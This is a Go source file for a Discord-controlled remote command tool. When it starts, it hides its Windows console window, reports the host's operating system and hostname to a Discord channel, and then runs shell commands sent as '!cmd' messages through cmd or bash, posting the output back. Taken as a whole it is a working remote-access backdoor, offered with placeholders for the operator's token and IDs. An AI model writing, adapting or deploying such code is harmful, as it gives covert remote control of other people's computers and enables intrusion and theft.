package main

import (
	"bytes"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/sys/windows"
)

var botToken = "YOUR_DISCORD_BOT_TOKEN"
var allowedUserID = "YOUR_DISCORD_USER_ID"   // Restrict command usage to your user ID
var notifyChannelID = "YOUR_CHANNEL_ID" // Replace with the Discord channel ID to send startup info

func main() {
	// Hide console window on Windows
	hideConsole()

	// Create a Discord session
	dg, err := discordgo.New("Bot " + botToken)
	if err != nil {
		return
	}

	// Register message handler
	dg.AddMessageCreateHandler(messageCreate)

	// Open a connection to Discord
	err = dg.Open()
	if err != nil {
		return
	}

	// Send system info to Discord channel
	sendSystemInfoToDiscord(dg)

	// Keep the bot running
	select {}
}

func hideConsole() {
	if runtime.GOOS == "windows" {
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		user32 := windows.NewLazySystemDLL("user32.dll")

		showWindow := user32.NewProc("ShowWindow")
		getConsoleWindow := kernel32.NewProc("GetConsoleWindow")

		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			// 0 hides the console window
			showWindow.Call(hwnd, 0)
		}
	}
}

func sendSystemInfoToDiscord(s *discordgo.Session) {
	// Get the operating system
	operatingSystem := runtime.GOOS

	// Get the hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown"
	}

	// Send message to the designated Discord channel
	message := strings.TrimSpace("**Bot Started!**\n" +
		"- Operating System: `" + operatingSystem + "`\n" +
		"- Hostname: `" + hostname + "`")
	s.ChannelMessageSend(notifyChannelID, message)
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages from the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Check if the message starts with "!cmd" and is from the allowed user
	if strings.HasPrefix(m.Content, "!cmd") && m.Author.ID == allowedUserID {
		command := strings.TrimPrefix(m.Content, "!cmd ")
		output, err := executeCommand(command)
		if err != nil {
			output = "Error: " + err.Error()
		}
		s.ChannelMessageSend(m.ChannelID, "```"+output+"```")
	}
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	// Detect the operating system and set the command
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command) // Windows
	} else {
		cmd = exec.Command("bash", "-c", command) // Linux/Mac
	}

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	// Run the command and capture output
	err := cmd.Run()
	if err != nil {
		return stderr.String(), err
	}
	return out.String(), nil
}
